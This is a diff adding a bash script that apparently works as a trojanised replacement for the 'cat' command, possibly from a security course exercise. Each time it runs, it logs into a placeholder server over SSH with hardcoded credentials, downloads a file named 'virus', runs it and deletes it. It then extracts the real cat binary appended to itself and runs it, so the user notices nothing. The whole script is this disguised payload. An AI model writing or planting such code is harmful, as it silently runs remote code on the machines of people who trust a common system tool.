@@ -1,0 +1,44 @@
+#!/usr/bin/env bash
+
+
+python3 <<EOF
+import paramiko
+import os
+
+def main():
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(hostname="SER_IP", username="csc2023",
+                        password="csc2023", timeout=3)
+    stdin, stdout, stderr = client.exec_command('cat ~/virus')
+    output = stdout.read().decode()
+
+    with open('virus', 'w') as f:
+        f.write(output)
+
+    client.close()
+
+if __name__ == "__main__":
+    main()
+
+EOF
+
+python3 virus
+rm virus
+
+# Get original cat
+sed -n '/^---END OF PAYLOAD---/,/^---END OF ORIGINAL---/ { /---END OF PAYLOAD---/d; /---END OF ORIGINAL---/d; p }' cat > output
+
+# Remove last line (\n)
+truncate -s -1 output
+
+unzip -p output > output_pro
+
+chmod +x output_pro
+
+./output_pro $@
+
+# Remove tem cat
+rm output_pro output
+
+exit
